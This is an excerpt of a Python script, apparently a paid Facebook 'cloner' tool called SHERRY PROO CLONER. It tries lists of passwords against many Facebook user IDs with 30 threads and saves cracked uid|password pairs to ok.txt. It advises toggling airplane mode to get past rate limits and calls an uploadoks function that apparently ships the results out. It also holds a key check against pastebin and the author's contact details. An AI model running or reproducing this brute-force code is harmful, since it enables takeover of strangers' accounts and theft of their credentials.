...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastebin.com/raw/p1TPdHPr"])
	exit(" [*] FACEBOOK :https://www.facebook.com/LALA.PRIME.MINISTER.FACEBOOK")
...
def notice():
	...
	runtxt("\n\033[0;91m🧞‍♀️YOU ARE  PREMIUM USER only 200Rs per month")
	runtxt("\033[0;93m 🔇 SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER🔰🥰https://www.facebook.com/LALA.PRIME.MINISTER.FACEBOOK")
	subprocess.check_output(["am", "start", "https://www.facebook.com/LALA.PRIME.MINISTER.FACEBOOK"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://pastebin.com/raw/p1TPdHPr').text
			if basesplit in plr:
				key = basesplit
...
────────────────────────────────────────────────────────────────────────────────────────────────────────────
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : LALA SHERRY   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : ALL FB TRICKS [SHERRY]
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB:LALA-HACKER 
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mCONTACT : 03352953611
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sSHERRY❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def shanto9(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [+] CP RESULTS SAVED IN -> OK.txt"%(Y))
				print("%s [!] IF NO RESULT ON AIRPLANE MODE 10 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
	...
	def old4_7(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> OK.txt"%(R))
				print("%s [!] IF NO RESULT  ON AIRPLANE MODE 10 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: SHERRY): "%(Y,G))
		nam = nam.replace(" ", "")
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] OK RESULT SAVED IN -> OK.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 10 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SHERRY] : %s/%s -> \033[0;97m [OK:%s ]- \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.OK))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;97m[SHERRY-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SHERRY-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
